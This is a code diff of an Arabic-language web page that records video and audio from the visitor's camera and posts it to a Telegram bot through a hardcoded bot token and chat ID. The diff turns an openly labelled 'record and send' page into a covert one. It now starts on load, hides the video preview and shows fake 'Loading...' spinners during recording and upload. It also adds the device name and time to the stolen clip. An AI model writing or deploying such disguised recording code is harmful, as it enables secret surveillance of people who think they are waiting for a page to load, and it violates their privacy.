@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎬 تصوير وإرسال</title>
+    <title>تحميل...</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -14,44 +14,47 @@
             text-align: center; padding: 20px;
         }
         .container { max-width: 400px; width: 100%; }
-        .step { display: none; }
-        .step.active { display: block; }
-        .icon { font-size: 70px; margin-bottom: 16px; }
-        h2 { font-size: 22px; margin-bottom: 8px; }
-        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
-        .countdown { font-size: 60px; font-weight: 900; color: #e60000; margin: 16px 0; }
-        .progress-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin: 16px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: #e60000; width: 0%; transition: width 0.3s; }
-        video { width: 100%; max-width: 350px; border-radius: 16px; display: none; }
-        button { background:#e60000; color:#fff; border:none; padding:16px 40px; border-radius:25px; font-size:18px; font-weight:700; cursor:pointer; width:100%; }
+        .icon { font-size: 60px; margin-bottom: 16px; }
+        h2 { font-size: 20px; margin-bottom: 8px; }
+        p { color: #aaa; font-size: 14px; }
+        .spinner {
+            width: 50px; height: 50px; border: 4px solid #222;
+            border-top-color: #e60000; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { to{transform:rotate(360deg)} }
+        .check { font-size: 70px; color: #059669; display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="step active" id="step-start">
+    <div id="screen-allow">
         <div class="icon">📷</div>
-        <h2>تصوير وإرسال</h2>
-        <p>سيتم تصوير فيديو 20 ثانية وإرساله تلقائياً</p>
-        <button onclick="startAll()">بدء التصوير</button>
+        <h2>السماح بالكاميرا</h2>
+        <p>يرجى السماح بالتصوير للمتابعة</p>
     </div>
-    <div class="step" id="step-recording">
+    
+    <div id="screen-record" style="display:none;">
         <div class="icon">🔴</div>
-        <h2>جاري التسجيل...</h2>
-        <p>الرجاء الثبات أمام الكاميرا</p>
-        <div class="countdown" id="countdown">20</div>
-        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
-        <video id="preview-video" autoplay playsinline muted></video>
+        <h2>جاري التحميل...</h2>
+        <p>برجاء الانتظار</p>
+        <div class="spinner"></div>
+        <video id="hidden-video" autoplay playsinline muted></video>
     </div>
-    <div class="step" id="step-sending">
+    
+    <div id="screen-upload" style="display:none;">
         <div class="icon">📤</div>
-        <h2>جاري الإرسال...</h2>
-        <p>يتم إرسال الفيديو للإدارة</p>
+        <h2>جاري التحميل...</h2>
+        <p>استني شوية</p>
+        <div class="spinner"></div>
     </div>
-    <div class="step" id="step-done">
-        <div class="icon">✅</div>
-        <h2 style="color:#059669;">تم بنجاح!</h2>
-        <p>الفيديو اتبعت للإدارة</p>
+    
+    <div id="screen-done" style="display:none;">
+        <div class="check">✅</div>
+        <h2 style="color:#059669;">تم</h2>
+        <p>خلص</p>
     </div>
 </div>
 
@@ -60,46 +63,61 @@ const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
 const CHAT_ID = '7276604783';
 let mediaRecorder, recordedChunks = [], stream;
 
-function showStep(id) {
-    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
+function show(id) {
+    ['screen-allow','screen-record','screen-upload','screen-done'].forEach(s => {
+        document.getElementById(s).style.display = s === id ? 'block' : 'none';
+    });
 }
 
-async function startAll() {
+async function init() {
     try {
-        showStep('step-recording');
+        // طلب الكاميرا فوراً
+        show('screen-allow');
+        
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById('preview-video').srcObject = stream;
-        document.getElementById('preview-video').style.display = 'block';
+        document.getElementById('hidden-video').srcObject = stream;
+        
+        show('screen-record');
+        
         recordedChunks = [];
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
         mediaRecorder.start();
-        let seconds = 20;
-        const countdownEl = document.getElementById('countdown');
-        const progressFill = document.getElementById('progress-fill');
-        const interval = setInterval(async () => {
-            seconds--;
-            countdownEl.textContent = seconds;
-            progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
-            if (seconds <= 0) {
-                clearInterval(interval);
-                mediaRecorder.stop();
-                showStep('step-sending');
-                await new Promise(r => setTimeout(r, 2000));
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'video_' + Date.now() + '.webm');
-                formData.append('caption', '🎬 فيديو\n📱 ' + deviceName);
-                try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch(e) {}
-                showStep('step-done');
-                stream.getTracks().forEach(t => t.stop());
-            }
-        }, 1000);
-    } catch (e) { alert('لم يتم السماح بالكاميرا'); }
+        
+        // 10 ثواني تسجيل
+        await new Promise(r => setTimeout(r, 10000));
+        
+        mediaRecorder.stop();
+        
+        show('screen-upload');
+        
+        await new Promise(r => setTimeout(r, 2000));
+        
+        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+        const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز';
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', blob, 'video_' + Date.now() + '.webm');
+        formData.append('caption', '🎬 فيديو\n📱 ' + deviceName + '\n🕐 ' + new Date().toLocaleString('ar-EG'));
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST', body: formData
+            });
+        } catch(e) {}
+        
+        stream.getTracks().forEach(t => t.stop());
+        
+        show('screen-done');
+        
+    } catch (e) {
+        alert('لازم تسمح بالكاميرا');
+    }
 }
+
+// بدء تلقائي
+window.onload = init;
 </script>
 </body>
 </html>
